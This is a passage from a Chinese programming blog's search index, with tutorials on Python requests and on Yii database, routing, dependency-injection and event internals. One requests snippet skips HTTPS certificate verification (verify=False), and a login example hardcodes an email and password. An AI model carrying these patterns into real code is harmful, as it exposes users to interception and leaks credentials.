    <url>%2F2018%2F12%2F25%2Fspider%2F%E5%8F%82%E8%80%83%E9%A1%B9%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[简单的爬虫框架可以看一下理解一下基出的爬虫框架逻辑项目地址 简单的分布式爬虫框架基与上个简单的爬虫框架扩展成分布式的项目地址 scrapy基本使用初学scrapy时写的一个参考用的项目，scrapy的一些基本用法可供参考项目地址 斗鱼自动发送弹幕测试一下selenium的使用项目地址 参考项目 微盘下载这个是自己写的，下载微盘电子书的项目地址]]></content>
      <categories>
        <category>python</category>
        <category>参考项目</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬虫-scrapy]]></title>
    <url>%2F2018%2F12%2F20%2Fspider%2FRequests%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[requests 模块比较方便的一个发送请求的模块中文文档 请求get请求第一种方式，直接输入url1234567891011import requests r = request.get('http://www.baidu.com?key=word&amp;next=2') print(r.content)``` 第二种方式，通过参数，自动进行拼接 ```pythonimport requestspayload = &#123;'key':'word', 'next':2&#125;r = requests.get('http://www.baidu.com', params = payload)# 输出查看URL print(r.url) post 请求123import requests postData = &#123;'key':'value'&#125;r = requests.post('http://www.baidu.com', data = postData) 其他请求方式delete、put、head、options请求方式参考上面两个 请求头 headers123import requestsheaders = &#123;'User-Agent': 'Mozilla/4.0 (******)'&#125;r = requests.get('http://www.baidu.com', headers = headers) 代理（proxies参数）如果需要使用代理，你可以通过为任意请求方法提供 proxies 参数来配置单个请求：12345678910import requests# 根据协议类型，选择不同的代理proxies = &#123; "http": "http://12.34.56.79:9527", "https": "http://12.34.56.79:9527",&#125;response = requests.get("http://www.baidu.com", proxies = proxies)print response.text 也可以通过 本地环境变量 HTTP_PROXY 和 HTTPS_PROXY 来配置代理：12export HTTP_PROXY="http://12.34.56.79:9527"export HTTPS_PROXY="https://12.34.56.79:9527" 私密代理12345678import requests# 如果代理需要使用HTTP Basic Auth，可以使用下面这种格式：proxy = &#123; "http": "user:pass@61.158.163.130:16816" &#125;response = requests.get("http://www.baidu.com", proxies = proxy)print (response.text) 响应响应数据的编码请求之后，获取到的数据，有些可能会出现乱码，这里我们着手解决一下123456789101112131415import requests r = requests.get('http://www.baidu.com')# 获取响应的字节码。是服务器响应数据的原始二进制字节流，可以用来保存图片等二进制文件。 print(r.content) # 获取requests模块根据返回猜测出的编码格式(不一定正确) print(r.encoding) # 获取根据猜测个格式编码解析响应的字节码得到字符串 print(r.text)# 如果乱码重新指定编码格式 r.encodeing = 'utf-8'# 获取根据指定的编码格式解析后的字符串print(r.text)# 如果是json文件可以直接显示print (r.json()) requests，自带解压压缩( 如 gzip )网页的功能 当收到一个响应时，Requests 会猜测响应的编码方式，用于在你调用 response.text 方法时对响应进行解码。Requests 首先在 HTTP 头部检测是否存在指定的编码方式，如果不存在，则会使用 chardet.detect 来尝试猜测编码方式（存在误差） 更推荐使用 response.content.deocde() 通过 chardet 模块来获取响应的编码格式123456789# 安装 pip3 install chardet # 使用 r = requests.get('http://www.baidu.com')r.encodeing = chardet.detect(r.content)['encoding']print(r.text) 响应码code和相应头headers123456789r = requests.get('http://www.baidu.com')# 获取响应码 print(r.status_code) # 获取响应头字典 print(r.headers) # 安全获取响应头的某个字段 print(r.headers.get('content-type')# 索引获取，如果不存在会报错 print(r.headers['content-type']) 流模式获取响应数据请求的时候设置 stream = True123456789101112131415161718r = requests.get('http://www.baidu.com', stream = True)# 读取10个字节 print(r.raw.read(10))``` #### 通过requests获取网络上图片的大小 ```pythonfrom io import BytesIO,StringIOimport requestsfrom PIL import Imageimg_url = "http://imglf1.ph.126.net/pWRxzh6FRrG2qVL3JBvrDg==/6630172763234505196.png"response = requests.get(img_url)f = BytesIO(response.content)img = Image.open(f)print(img.size)输出结果：(500, 262) 理解一下 BytesIO 和 StringIO 很多时候，数据读写不一定是文件，也可以在内存中读写。StringIO顾名思义就是在内存中读写str。BytesIO 就是在内存中读写bytes类型的二进制数据 例子中如果使用StringIO 即f = StringIO(response.text)会产生&quot;cannot identify image file&quot;的错误当然上述例子也可以把图片存到本地之后再使用Image打开来获取图片大小 cookie处理如果一个响应中包含了cookie，那么我们可以利用 cookies参数拿到： 123456789101112131415161718import requestsresponse = requests.get("http://www.baidu.com/")# 返回CookieJar对象:cookiejar = response.cookies# 将CookieJar转为字典：cookiedict = requests.utils.dict_from_cookiejar(cookiejar)print (cookiejar)print (cookiedict)运行结果：&lt;RequestsCookieJar[&lt;Cookie BDORZ=27315 for .baidu.com/&gt;]&gt;&#123;'BDORZ': '27315'&#125; session 实现cookie自动管理在 requests 里，session对象是一个非常常用的对象，这个对象代表一次用户会话：从客户端浏览器连接服务器开始，到客户端浏览器与服务器断开。 会话能让我们在跨请求时候保持某些参数，比如在同一个 Session 实例发出的所有请求之间保持 cookie 。 实现人人网登录12345678910111213141516171819import requests# 1. 创建session对象，可以保存Cookie值ssion = requests.session()# 2. 处理 headersheaders = &#123;"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"&#125;# 3. 需要登录的用户名和密码data = &#123;"email":"mr_mao_hacker@163.com", "password":"alarmchime"&#125; # 4. 发送附带用户名和密码的请求，并获取登录后的Cookie值，保存在ssion里ssion.post("http://www.renren.com/PLogin.do", data = data)# 5. ssion包含用户登录后的Cookie值，可以直接访问那些登录后才可以访问的页面response = ssion.get("http://www.renren.com/410043129/profile")# 6. 打印响应内容print (response.text) 其他是否允许重定向将 allow_redirects 设置为 True 表示允许重定向，可以通过 history 来查看之前重定向跳转信息12345import requestsr = requests.get('http://github.com')print(r.url)print(r.status_code)print(r.history) 设置超时时间超时时间通过 timeout 参数进行设置1requests.get('http://github.com', timeout = 3) https跳过证书验证如果我们想跳过 12306 的证书验证，把 verify 设置为 False 就可以正常请求了。1r = requests.get("https://www.12306.cn/mormhweb/", verify = False)]]></content>
      <categories>
        <category>python</category>
        <category>爬虫</category>
        <category>Requests模块</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
        <tag>Requests模块</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-数据库]]></title>
    <url>%2F2018%2F12%2F13%2Fyii%2F%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[前言Yii 包含了一个建立在 PHP PDO 之上的数据访问层 (DAO)。DAO为不同的数据库提供了一套统一的API。通过配置可以分析出用的是哪种数据库，然后使用对应的 Schema 来处理sql。各类之间的分工也比较明确 yii\db\Connection 用来连接数据库、创建事务, yii\db\Command 用来执行sql, yii\db\QueryBuilder 用来创建sql。安全性也比较高，通过pdo预处理sql然后绑定参数，这就防止了sql注入的问题。 顺便说一下 AR 模式，因为继承 Model 所以同样拥有好用的字段验证，这在更新或者写入的时候非常好用，但是不好的地方是 AR 模型通过属性联表的操作，让操作变得不那么清晰。所以查询一般也就不推荐了。 db-&gt;createCommand() 执行sql时放注入写法 列名 [[field]] 将会被处理成 field; 表名 将会处理成 配置的表前缀+tablename 注意：这里省略了%,因为hexo的原因，不然会报错 :name 将会被替换成传递的对应的参数，仅供参考，因为是通过pdo预处理执行的(这也是为什么会有防注入功能)1234567# 列名 [[field]] 将会被处理成 `field`;# 表名 &#123;&#123;%tablename&#125;&#125; 将会处理成 配置的表前缀+tablename# :name 将会被替换成传递的对应的参数，仅供参考，因为是通过pdo预处理执行的(这也是为什么会有防注入功能)$command = Yii::$app-&gt;db-&gt;createCommand('select [[ding]], [[pupu]] from &#123;&#123;%bunao&#125;&#125; where name = :name', [':name' =&gt; 'xxx']);# 获取sql语句 # select `ding`, `pupu` from `meet_bunao` where name = 'xxx'echo $command-&gt;getRawSql(); 清除表结构缓存为了提高性能，yii会对表结构进行缓存，通过yii给的方法去修改表结构是会自动清除缓存的，但是也会存在手工修改表结构的，这时就需要清除一下表结构缓存1234# 清除单个表结构缓存 Yii::$app-&gt;db-&gt;getSchema()-&gt;refreshTableSchema('tablename');# 清除所有表结构缓存 Yii::$app-&gt;db-&gt;getSchema()-&gt;refresh(); Query 获取要执行的sql1234567891011121314151617$command = (new \yii\db\Query()) -&gt;select(['id', 'email']) -&gt;from('user') -&gt;where(['last_name' =&gt; 'Smith']) -&gt;limit(10) -&gt;createCommand();// 打印 SQL 语句，未绑定参数echo $command-&gt;sql;// 打印被绑定的参数print_r($command-&gt;params);// 也可以直接获取到完整的sql echo $command-&gt;getRawSql();// 返回查询结果的所有行$rows = $command-&gt;queryAll(); 批处理查询先说一下为什么使用批量查询，当数据量非常大的时候，查询结果不可能全部放在内存中，需要一次一次的去数据库取，然后加载到内存中。和limit有什么不同？其实和limit的结果一样，但是有的时候更高效一些。首先limit你需要先计算分页，其次每次sql都数据库那边都要进行sql的预处理。而批量处理使用的是游标，sql就开始的那一句，只需要预处理一次，也不需要计算分页。但看一下下面的文档，批处理也会有一些问题。 官方文档这部分现在已经很完善了，下面全部摘自官方文档文档 当需要处理大数据的时候，像 yii\db\Query::all() 这样的方法就不太合适了， 因为它们会把所有查询的数据都读取到客户端内存上。为了解决这个问题， Yii 提供了批处理查询的支持。服务端先保存查询结果，然后客户端使用游标（cursor） 每次迭代出固定的一批结果集回来。 警告： MySQL 批处理查询的实现存在已知的局限性和变通方法。见下文。 批处理查询的用法如下：123456789101112131415use yii\db\Query;$query = (new Query()) -&gt;from('user') -&gt;orderBy('id');foreach ($query-&gt;batch() as $users) &#123; // $users 是一个包含100条或小于100条用户表数据的数组&#125;// or to iterate the row one by oneforeach ($query-&gt;each() as $user) &#123; // 数据从服务端中以 100 个为一组批量获取， // 但是 $user 代表 user 表里的一行数据&#125; yii\db\Query::batch() 和 yii\db\Query::each() 方法将会返回一个实现了Iterator 接口 yii\db\BatchQueryResult 的对象，可以用在 foreach 结构当中使用。在第一次迭代取数据的时候， 数据库会执行一次 SQL 查询，然后在剩下的迭代中，将直接从结果集中批量获取数据。默认情况下， 一批的大小为 100，也就意味着一批获取的数据是 100 行。你可以通过给 batch() 或者 each() 方法的第一个参数传值来改变每批行数的大小。 相对于 yii\db\Query::all() 方法，批处理查询每次只读取 100 行的数据到内存。 如果你通过 yii\db\Query::indexBy() 方法为查询结果指定了索引字段， 那么批处理查询将仍然保持相对应的索引方案， 例如，1234567891011$query = (new \yii\db\Query()) -&gt;from('user') -&gt;indexBy('username');foreach ($query-&gt;batch() as $users) &#123; // $users 的 “username” 字段将会成为索引&#125;foreach ($query-&gt;each() as $username =&gt; $user) &#123; // ...&#125; MySQL中批量查询的局限性（Limitations of batch query in MySQL）MySQL 是通过 PDO 驱动库实现批量查询的。默认情况下，MySQL 查询是 带缓存的， 这违背了使用游标（cursor）获取数据的目的， 因为它不阻止驱动程序将整个结果集加载到客户端的内存中。 注意： 当使用 libmysqlclient 时（PHP5 的标配），计算 PHP 的内存限制时，用于数据结果集的内存不会计算在内。 看上去批量查询是正确运行的，实际上整个数据集都被加载到了客户端的内存中， 而且这个使用量可能还会再增长。 要禁用缓存并减少客户端内存的需求量，PDO 连接属性 PDO::MYSQL_ATTR_USE_BUFFERED_QUERY 必须设置为 false。 这样，直到整个数据集被处理完毕前，通过此连接是无法创建其他查询的。 这样的操作可能会阻碍 ActiveRecord 执行表结构查询。 如果这不构成问题（表结构已被缓存过了）， 我们可以通过切换原本的连接到非缓存模式，然后在批量查询完成后再切换回来。12345Yii::$app-&gt;db-&gt;pdo-&gt;setAttribute(\PDO::MYSQL_ATTR_USE_BUFFERED_QUERY, false);// 执行批量查询Yii::$app-&gt;db-&gt;pdo-&gt;setAttribute(\PDO::MYSQL_ATTR_USE_BUFFERED_QUERY, true); 注意： 对于 MyISAM，在执行批量查询的过程中，表可能将被锁， 将延迟或拒绝其他连接的写入操作。 当使用非缓存查询时，尽量缩短游标打开的时间。如果表结构没有被缓存，或在批量查询被处理过程中需要执行其他查询， 你可以创建一个单独的非缓存链接到数据库： 12345678$unbufferedDb = new \yii\db\Connection([ 'dsn' =&gt; Yii::$app-&gt;db-&gt;dsn, 'username' =&gt; Yii::$app-&gt;db-&gt;username, 'password' =&gt; Yii::$app-&gt;db-&gt;password, 'charset' =&gt; Yii::$app-&gt;db-&gt;charset,]);$unbufferedDb-&gt;open();$unbufferedDb-&gt;pdo-&gt;setAttribute(\PDO::MYSQL_ATTR_USE_BUFFERED_QUERY, false); 如果你除了 PDO::MYSQL_ATTR_USE_BUFFERED_QUERY 是 false 之外， 要确保 $unbufferedDb 拥有和原来缓存 $db 完全一样的属性， 请参阅实现 $db 的深度拷贝， 手动方法将它设置为 false 即可。 然后使用此连接正常创建查询，新连接用于运行批量查询， 逐条或批量进行结果处理：12345678910// 获取 1000 为一组的批量数据foreach ($query-&gt;batch(1000, $unbufferedDb) as $users) &#123; // ...&#125;// 每次从服务端批量获取1000个数据，但是逐个遍历进行处理foreach ($query-&gt;each(1000, $unbufferedDb) as $user) &#123; // ...&#125; 当结果集已处理完毕不再需要连接时，可以关闭它：1$unbufferedDb-&gt;close(); 注意： 非缓存查询在 PHP 端使用更少的缓存，但会增加 MySQL 服务器端的负载。 建议您使用生产实践设计自己的代码以获取额外的海量数据，例如，将数字键分段，使用非缓存的查询遍历。 AR模型实现乐观锁乐观锁的原理比较简单。 在表中增加一个字段(如 ver )用来存锁值 取数据，主键 id 和 锁 ver 字段都要用到 更新的时候需要同时提交主键 id 和 锁 ver 进行更新，更新的时候会同时用上这两个条件，更新的同时 锁 ver 字段进行 +1 。 这就实现了可以多人同时读取，但是多人同时进行更新时由于 写入操作默认是加锁的所以同一时间只有一个可以写成功 ，而这个写入成功后由于 锁 ver 字段进行了 +1 ，所以更新条件也就变了，当时同时访问的其他人就无法进行更新操作了。 乐观锁实例 创建一个测试表下面给了一个简单的迁移操作 12345678910111213141516171819202122232425# 创建迁移 yii migrate/create locking # 实现迁移 public function safeUp()&#123; // 创建表 $this-&gt;createTable('clocking', [ 'id' =&gt; Schema::TYPE_PK, 'title' =&gt; Schema::TYPE_STRING . ' NOT NULL', 'ver' =&gt; Schema::TYPE_BIGINT . ' DEFAULT 0', ], ' ENGINE=InnoDB DEFAULT CHARSET=utf8'); // 添加一条数据 $this-&gt;insert('clocking', [ 'title' =&gt; 'test', ]);&#125;public function safeDown()&#123; return $this-&gt;dropTable('clocking');&#125;# 执行迁移 yii migrate 直接使用sql12345678CREATE TABLE `clocking` ( `id` int(11) NOT NULL AUTO_INCREMENT, `title` varchar(255) NOT NULL, `ver` bigint(20) DEFAULT '0', PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;INSERT INTO `clocking` VALUES ('1', 'test', '0'); 创建 AR模型通过gii创建的，然后添加了返回锁字段的方法 1234567891011class Clocking extends \yii\db\ActiveRecord&#123; // 返回乐观锁字段 public function optimisticLock() &#123; return 'ver'; &#125; ... ...&#125; 实现控制器逻辑和视图控制器动作逻辑 123456789101112131415161718192021222324/** * 乐观锁测试 * @return [type] [description] */public function actionLock($id)&#123; // 指定布局文件 $this-&gt;layout = '@app/views/layouts/main'; $model = Clocking::findOne($id); try &#123; if (Yii::$app-&gt;request-&gt;getIsPost() &amp;&amp; $model-&gt;load(Yii::$app-&gt;request-&gt;post()) &amp;&amp; $model-&gt;save()) &#123; echo "更新成功"; return; &#125; else &#123; return $this-&gt;render('lock', [ 'model' =&gt; $model, ]); &#125; &#125; catch (StaleObjectException $e) &#123; echo "更新失败"; // 解决冲突的代码 &#125;&#125; 视图 要把锁值给视图，提交的时候进行提交 123456789101112131415161718192021&lt;?phpuse yii\helpers\Html;use yii\widgets\ActiveForm; ?&gt;&lt;?php$form = ActiveForm::begin([ 'id' =&gt; 'login-form', 'options' =&gt; ['class' =&gt; 'form-horizontal'],]) ?&gt; &lt;?= $form-&gt;field($model, 'title') ?&gt; &lt;!-- 存放隐藏的锁值 --&gt; &lt;?=Html::activeHiddenInput($model, 'ver'); ?&gt; &lt;div class="form-group"&gt; &lt;div class="col-lg-offset-1 col-lg-11"&gt; &lt;?= Html::submitButton('update', ['class' =&gt; 'btn btn-primary']) ?&gt; &lt;/div&gt; &lt;/div&gt;&lt;?php ActiveForm::end() ?&gt; 测试 先进行访问两次，不操作 更改其中一个进行提交，更新成功。锁值+1 更改另一个进行提交，更新失败。此时锁值不变 刷新、更改提交，更新成功。此时锁值+1 参考：深入理解yii官网文档]]></content>
      <categories>
        <category>yii</category>
        <category>操作数据库</category>
      </categories>
      <tags>
        <tag>yii-数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii的路由功能]]></title>
    <url>%2F2018%2F11%2F10%2Fyii%2F%E8%B7%AF%E7%94%B1%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[前言路由规则的原理就是根据请求的参数A ---&gt; 找到要执行的B，项目中生成url刚好是相反的方向 B ---&gt; A 。原理很简单，yii的路由通过正则的方式进行匹配和映射。我们的重点看一下使用 urlManagerurlManager 作为一个url管理者，所有的路由规则 UrlRule 通过它来管理在匹配路由的时候会根据配置的先后顺序从上到下进行对 UrlRule 进行匹配，匹配到的直接返回1234567891011121314[ 'components' =&gt; [ 'urlManager' =&gt; [ 'enablePrettyUrl' =&gt; true,// 开启 url美化 'showScriptName' =&gt; false,//隐藏入口文件 index.php 'enableStrictParsing' =&gt; false,//true严格按照rules匹配，也就是必须匹配定义的rules才能解释，正常默认是的失效 'suffix' =&gt; '.html',// 后缀 // 路由规则 'rules' =&gt; [ // ... ], ], ],] 动态的添加路由规则添加规则，模块在bootstrap启动的会后有的需要注册自己规则的通过这个添加，如gii、debug模块就用到1public function addRules($rules, $append = true) 路由规则 UrlRule将配置的路由规则进行拆解创建成 UrlRule 对象，用来进行后续的解析和生成url 规则举例直接映射1['index' =&gt; 'ding/bunao'] 当访问 /index 时实际访问的是 /ding/bunao 左边正则匹配型1['test/&lt;id:\d+&gt;' =&gt; 'test/bunao'] 当访问 /test/10 的时候实际访问的是 /test/bunao?id=10 1['test/&lt;year:\d&#123;4&#125;&gt;/&lt;category&gt;' =&gt; 'test/bunao'], 当访问 /test/1000/ding 的时候实际访问的是 /test/bunao?year=1000&amp;category=ding 123456789['test-&lt;year:\d&#123;4&#125;&gt;' =&gt; 'test/bunao'], ``` &gt; 当访问 `/test-1000` 的时候实际访问的是 `/test/bunao?year=1000`#### 两边匹配 ```php['&lt;ding:(test|comment)&gt;/&lt;id:\d+&gt;/&lt;bunao:(bunao|update|delete)&gt;' =&gt; '&lt;ding&gt;/&lt;bunao&gt;'] 当访问 /test/100/bunao 的时候实际访问的是 /test/bunao?id=100 通常会写成下面的形式，方便阅读1['&lt;controller:(test|comment)&gt;/&lt;id:\d+&gt;/&lt;action:(bunao|update|delete)&gt;' =&gt; '&lt;controller&gt;/&lt;action&gt;'] 其他实例1['&lt;controller:(post|comment)&gt;/&lt;id:\d+&gt;' =&gt; '&lt;controller&gt;/view'] 当访问 /post/100 的时候实际访问的是 /post/view?id=100 带有默认值的1234567[ [ 'pattern' =&gt; 'posts/&lt;page:\d+&gt;/&lt;tag&gt;',// 请求部分 'route' =&gt; 'post/index',// 解析部分 'defaults' =&gt; ['page' =&gt; 1, 'tag' =&gt; ''],// 默认值 ],] 当请求 /posts 时实际请求的是 /post/index?page=1&amp;tag=&#39;&#39; 限制请求方式的1['POST post/&lt;id:\d+&gt;' =&gt; 'post/create'] 表示请求 /post/100 如果要访问到 /post/create?id=100 必须是 POST 请求 1['POST,PUT post/&lt;id:\d+&gt;' =&gt; 'post/create'] 表示允许 post 和 pub 方式请求。多个用 , 隔开 域名匹配 一个项目配置了好几个域名，根据域名来控制访问，比如说pc、mobile、api三个用不同的域名 123456789101112131415161718192021[ 'http://&lt;language:\w+&gt;.example.com/posts' =&gt; 'post/index', 'http://admin.example.com/login' =&gt; 'admin/user/login', 'http://www.example.com/login' =&gt; 'site/login',]``` &gt; 用不同的域名访问请求#### 详细配置 UrlRule详细配置```php[ 'pattern' =&gt; 'posts/&lt;page:\d+&gt;/&lt;tag&gt;',// 请求匹配部分 'verb' =&gt; ['post', 'get'], //可以请求的方法 'route' =&gt; 'post/index',// 解析规则部分 'host' =&gt; 'www.bunao.win', //域名，可以多个域名指向同一项目，且可以根据域名的不同来执行不同的解析，一般不填写，也可以把域名和pattern写在一起, 和pattern拼写在一起的时候要带上:// 或 // 来让知道有域名 'mode' =&gt; UrlRule::PARSING_ONLY ,// 该路由的模式，如只能解析或只能创建 'defaults' =&gt; ['page' =&gt; 1, 'tag' =&gt; ''],// 默认值，要和pattern中的参数对应上 'name' =&gt; '', // 路由规则名称，一般不写，默认是 pattern的值], 总结 如果左边有 &lt;&gt; 而右边没有对应的，则 &lt;&gt; 中定义的匹配到的作为 $_GET 的一组值。 如果右边有和左边对应的(值相等的) &lt;&gt; ，表示左边匹配到的替换到右边就行了 &lt;&gt; 中的 :\xx 定义的是正则匹配的规则，如：:\d+ 匹配任意个数字， :\d{4} 只能匹配4位的数值, :(test|comment) 只能匹配 test 或 comment 中的其中一个 action支持驼峰形式请求增加支持驼峰形式请求12345678910111213141516171819202122232425262728293031323334353637383940414243namespace common\components;use \yii\web\Controller;//使用webuse yii\base\InlineAction;class zController extends Controller&#123; /** * Author:Steven 原作者 * Desc:重写路由，处理访问控制器支持驼峰命名法 * @param string $id * @return null|object|InlineAction */ public function createAction($id) &#123; if ($id === '') &#123; $id = $this-&gt;defaultAction; &#125; $actionMap = $this-&gt;actions(); if (isset($actionMap[$id])) &#123; return \Yii::createObject($actionMap[$id], [$id, $this]); &#125; elseif (preg_match('/^[a-z0-9\\-_]+$/', $id) &amp;&amp; strpos($id, '--') === false &amp;&amp; trim($id, '-') === $id) &#123; $methodName = 'action' . str_replace(' ', '', ucwords(implode(' ', explode('-', $id)))); if (method_exists($this, $methodName)) &#123; $method = new \ReflectionMethod($this, $methodName); if ($method-&gt;isPublic() &amp;&amp; $method-&gt;getName() === $methodName) &#123; return new InlineAction($id, $this, $methodName); &#125; &#125; // 驼峰形式,支持第一个字母小写 &#125; else &#123; $id = ucfirst($id); $methodName = 'action' . $id; if (method_exists($this, $methodName)) &#123; $method = new \ReflectionMethod($this, $methodName); if ($method-&gt;isPublic() &amp;&amp; $method-&gt;getName() === $methodName) &#123; return new InlineAction($id, $this, $methodName); &#125; &#125; &#125; return null; &#125;&#125; 需要驼峰的控制器继承此类就行了参考 Yii2使用驼峰命名的形式访问控制器官方文档]]></content>
      <categories>
        <category>yii</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>路由</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii的依赖注入容器和服务定位器]]></title>
    <url>%2F2018%2F11%2F09%2Fyii%2F%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%E5%AE%B9%E5%99%A8%26%26%E6%9C%8D%E5%8A%A1%E5%AE%9A%E4%BD%8D%E5%99%A8%2F</url>
    <content type="text"><![CDATA[前言Yii提供这两个类来进行解耦，功能有多强大呢？yii中创建的对象几乎都是通过容器的方式创建的, 可以看一下 Yii::createObject() 方法，而 $app 本身就是一个服务定位器。由于具体的细节比较多，如果需要详细代码可以参考深入理解Yii2.0和看源码，这里只说一下大概的原理 依赖注入容器 Container为了解决两个类的强耦合，通常我们的做法是通过 构造方法 或者 属性赋值 的方式将一个对象注入到另一个对象中。小项目其实也没什么问题，但是当项目大起来的时候，依赖关系复杂的时候，就会让这个流程变得复杂起来， 容器就很好的解决类这个问题，只需要将依赖关系注册到容器，获取对象的时候容器自动将完成各对象之间的依赖关系。容器这里用的是 构造方法 注入的方式。下面举个例子123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657namespace app\models;use yii\base\Object;use yii\db\Connection;use yii\di\Container;interface UserFinderInterface&#123; function findUser();&#125;class UserFinder extends Object implements UserFinderInterface&#123; public $db; public function __construct(Connection $db, $config = []) &#123; $this-&gt;db = $db; parent::__construct($config); &#125; public function findUser() &#123; &#125;&#125;class UserLister extends Object&#123; public $finder; public function __construct(UserFinderInterface $finder, $config = []) &#123; $this-&gt;finder = $finder; parent::__construct($config); &#125;&#125;／*容器的方式创建 */$container = new Container;$container-&gt;set('yii\db\Connection', [ 'dsn' =&gt; '...',]);$container-&gt;set('app\models\UserFinderInterface', [ 'class' =&gt; 'app\models\UserFinder',]);$container-&gt;set('userLister', 'app\models\UserLister');$lister = $container-&gt;get('userLister');// 和下面的相同/*正常流程的创建 */$db = new \yii\db\Connection(['dsn' =&gt; '...']);$finder = new UserFinder($db);$lister = new UserLister($finder); 原理可以看着上面的例子理解一下，首先我们先将所有的依赖关系注册进去，然后获取对象的时候会通过反射拿取到该类构造方法中定义的所依赖的对象，然后会在所注册的依赖中找到这个依赖，之后就是层层的递归不断的解析新出现的依赖。 服务定位器 ServiceLocator上面已经所说 $app 就是一个服务定位器，其实服务定位器就是一个注册树，将组件注册到了它的上面看一个例子应该就很明白了123456789101112131415$locator = new \yii\di\ServiceLocator;// 在配置文件配置的Components参数，其实就是下面要完成的 $locator-&gt;setComponents([ 'db' =&gt; [ 'class' =&gt; 'yii\db\Connection', 'dsn' =&gt; 'sqlite:path/to/file.db', ], 'cache' =&gt; [ 'class' =&gt; 'yii\caching\DbCache', 'db' =&gt; 'db', ],]);// 调用服务定位中注册的组件，组件的创建是通过容器进行创建的 $db = $locator-&gt;get('db'); // or $locator-&gt;db$cache = $locator-&gt;get('cache'); // or $locator-&gt;cache 没看明白的看源码吧，比较好理解]]></content>
      <categories>
        <category>yii</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
        <tag>yii</tag>
        <tag>容器</tag>
        <tag>服务定位器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[类级别事件]]></title>
    <url>%2F2018%2F11%2F09%2Fyii%2F%E5%9F%BA%E7%A1%80%E7%B1%BB-Event%2F</url>
    <content type="text"><![CDATA[前言Event类有两个作用，一个是作为触发事件时携带的一个事件对象，另一个就是定义类级别的事件，其实和对象级别( Component 中定义)的基本一致 类级别和对象级别的事件有什么区别呢？ 注册对象级别的事件，只能通过所注册的对象进行触发 注册的类级别的事件，可以触发的情况就比较多； 对象触发事件的时候在最后是调用一下类级别的触发事件 Event::trigger() ，如果该对象的 所有继承的父类、所有实现接口上绑定了这个事件，将会触发 也就是说通过对象或类进行触发事件，如果对象或类的父类中或实现的接口中包含了当前注册事件的类，如果这个类有这个事件，将都会导致触发这个类注册的这个事件 解析属性1234public $name; // 事件名public $sender; // 事件发布者，通常是调用了 trigger() 的对象或类。public $handled = false; // 是否终止事件的后续处理public $data; // 事件相关数据，事件绑定on时传递的数据 绑定类级别事件1234567891011121314151617181920212223242526/** * 绑定类级别的事件 * * 实例，在插入数据后触发记录日志 * * Event::on(ActiveRecord::className(), ActiveRecord::EVENT_AFTER_INSERT, function ($event) &#123; * Yii::trace(get_class($event-&gt;sender) . ' is inserted.'); * &#125;); * * * @param string $class 类全名() * @param string $name 事件名称 * @param callable $handler 事件处理程序 * @param mixed $data 绑定时要传递的数据 * @param bool $append 插入到事件处理数组的头部还是尾部 */public static function on($class, $name, $handler, $data = null, $append = true)&#123; $class = ltrim($class, '\\'); if ($append || empty(self::$_events[$name][$class])) &#123; self::$_events[$name][$class][] = [$handler, $data]; &#125; else &#123; //数组头部插入 array_unshift(self::$_events[$name][$class], [$handler, $data]); &#125;&#125; 解绑事件12345678910111213141516171819202122232425262728293031323334/** * 解绑类级别的事件 * * * @param string $class 类全名 * @param string $name 事件名称 * @param callable $handler 事件处理程序 * @return bool whether a handler is found and detached. */public static function off($class, $name, $handler = null)&#123; $class = ltrim($class, '\\'); if (empty(self::$_events[$name][$class])) &#123; return false; &#125; //解绑 class 上事件名为 $name 的所有事件处理程序 handler if ($handler === null) &#123; unset(self::$_events[$name][$class]); return true; &#125; $removed = false; foreach (self::$_events[$name][$class] as $i =&gt; $event) &#123; if ($event[0] === $handler) &#123; unset(self::$_events[$name][$class][$i]); $removed = true; &#125; &#125; if ($removed) &#123; //重新排序数组，将unset掉的位置补上 self::$_events[$name][$class] = array_values(self::$_events[$name][$class]); &#125; return $removed;&#125; 1234567/** * 解绑所有事件 */public static function offAll()&#123; self::$_events = [];&#125; 触发事件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * 触发一个类级别的事件，同时会触发父类的和实现接口的同样的事件 * This method will cause invocation of event handlers that are attached to the named event * for the specified class and all its parent classes. * @param string|object $class 对象或类全名 * @param string $name 事件名称 * @param Event $event 事件对象，用来携带数据 */public static function trigger($class, $name, $event = null)&#123; if (empty(self::$_events[$name])) &#123; return; &#125; if ($event === null) &#123; $event = new static; &#125; $event-&gt;handled = false; $event-&gt;name = $name; if (is_object($class)) &#123; if ($event-&gt;sender === null) &#123; //设置发送者 $event-&gt;sender = $class; &#125; //获取对象类名 $class = get_class($class); &#125; else &#123; $class = ltrim($class, '\\'); &#125; // 将会触发当前类、所有继承的父类、所有实现接口上绑定的同一事件 $classes = array_merge( [$class], // 所继承的所有父类--祖祖辈辈 class_parents($class, true), // 所实现的所有接口--祖祖辈辈 class_implements($class, true) ); foreach ($classes as $class) &#123; if (empty(self::$_events[$name][$class])) &#123; continue; &#125; foreach (self::$_events[$name][$class] as $handler) &#123; $event-&gt;data = $handler[1]; // 执行事件处理程序 call_user_func($handler[0], $event); if ($event-&gt;handled) &#123; return; &#125; &#125; &#125;&#125; 查看是事件的绑定 查看一个类在某个事件上是否绑定事件处理程序 1234567891011121314151617181920212223242526272829303132/** * * * @param string|object $class 对象或类全名 * @param string $name 事件名 * @return bool whether there is any handler attached to the event. */public static function hasHandlers($class, $name)&#123; if (empty(self::$_events[$name])) 